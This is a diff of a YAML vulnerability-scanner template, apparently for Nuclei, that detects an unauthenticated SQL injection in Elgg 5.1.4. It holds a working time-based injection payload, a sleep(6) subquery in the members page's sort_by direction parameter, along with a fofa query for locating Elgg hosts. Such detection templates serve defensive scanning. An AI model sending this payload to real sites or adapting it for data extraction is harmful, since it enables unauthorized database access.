@@ -1,5 +1,4 @@
 id: elgg-sqli
-
 info:
   name: Elgg 5.1.4 - SQL Injection
   author: s4e-io
@@ -9,41 +8,38 @@ info:
   reference:
     - https://github.com/4rdr/proofs/blob/main/info/Elgg_unauth_SQLi_5.1.4.md
     - https://github.com/Elgg/Elgg
+  classification:
+    cwe-id:
+      - CWE-89
   metadata:
-    verified: true
-    max-request: 1
-    vendor: elgg
-    product: elgg
     fofa-query: icon_hash="413602919"
+    max-request: 1
+    product: elgg
+    vendor: elgg
+    verified: true
   tags: elgg,sqli,vuln
-
 flow: http(1) && http(2)
-
 http:
-  - raw:
+  - matchers:
+      - condition: and
+        dsl:
+          - contains(body,"elgg.js")
+          - status_code == 200
+        internal: true
+        type: dsl
+    raw:
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
-
-    matchers:
-      - type: dsl
+  - matchers:
+      - condition: and
         dsl:
-          - 'contains(body,"elgg.js")'
-          - 'status_code == 200'
-        condition: and
-        internal: true
-
-  - raw:
+          - duration >= 6
+          - contains(body,"All members")
+          - status_code == 200
+        type: dsl
+    raw:
       - |
         @timeout 20s
         GET /members?sort_by%5Bproperty%5D=name&sort_by%5Bproperty_type%5D=metadata&sort_by%5Bdirection%5D=desc%2c(select*from(select(sleep(6)))a) HTTP/1.1
         Host: {{Hostname}}
-
-    matchers:
-      - type: dsl
-        dsl:
-          - 'duration >= 6'
-          - 'contains(body,"All members")'
-          - 'status_code == 200'
-        condition: and
-
